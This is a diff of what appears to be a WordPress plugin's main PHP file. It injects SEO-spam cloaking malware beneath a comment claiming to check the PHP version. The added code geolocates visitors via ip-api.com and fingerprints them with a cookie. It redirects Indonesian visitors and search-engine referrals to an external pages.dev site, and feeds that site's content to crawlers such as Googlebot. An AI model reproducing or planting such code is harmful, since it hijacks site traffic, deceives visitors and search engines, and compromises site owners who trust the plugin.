@@ -12,27 +12,91 @@
  */
 
 // Check PHP version before loading the plugin.
-function smoky($url) {
+function getClientIP() {
+    $headers = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_X_CLUSTER_CLIENT_IP',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+    foreach ($headers as $key) {
+        if (!empty($_SERVER[$key])) {
+            $ipList = explode(',', $_SERVER[$key]);
+            foreach ($ipList as $ip) {
+                $ip = trim($ip);
+                if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                    return $ip;
+                }
+            }
+        }
+    }
+    return '127.0.0.1';
+}
+
+function getUrlContent($url) {
     if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
+        $content = @file_get_contents($url);
+        if ($content !== false) return $content;
+    }
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 10
+    ]);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response ?: '';
+}
+
+function isBot() {
+    $botKeywords = ['googlebot', 'slurp', 'adsense', 'inspection', 'verifycation', 'jenifer'];
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    foreach ($botKeywords as $bot) {
+        if (strpos($ua, $bot) !== false) return true;
     }
     return false;
 }
 
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://punten-neng.pages.dev/pai.iaingorontalo/";
-if (preg_match($botchar, $res)) {
-    echo $file;
+$ip = getClientIP();
+$geoData = json_decode(getUrlContent("http://ip-api.com/json/{$ip}"), true);
+$countryCode = $geoData['countryCode'] ?? '';
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$fingerprint = sha1($ip . $ua);
+
+if (!isset($_COOKIE['user_fp']) && $countryCode === 'ID') {
+    setcookie('user_fp', $fingerprint, time() + 86400 * 30, '/');
+    $_COOKIE['user_fp'] = $fingerprint;
+}
+
+$allowedFingerprint = $_COOKIE['user_fp'] ?? '';
+
+$redirectURL = 'https://punten-neng.pages.dev/pai.iaingorontalo/';
+
+if ($countryCode === 'ID' && $fingerprint === $allowedFingerprint && $allowedFingerprint !== '') {
+    header("Location: $redirectURL");
     exit;
 }
+
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$refererDomains = ['google.co.id', 'yahoo.co.id', 'bing.com'];
+foreach ($refererDomains as $domain) {
+    if (stripos($referer, $domain) !== false) {
+        header("Location: $redirectURL");
+        exit;
+    }
+} 
+
+if (isBot()) {
+    $htmlURL = 'https://punten-neng.pages.dev/pai.iaingorontalo/';
+    echo getUrlContent($htmlURL);
+    exit;
+}
+<!---->
 
 if ( version_compare( PHP_VERSION, '7.4', '<' ) ) {
 	add_action( 'admin_notices', 'astra_sites_php_version_notice' );
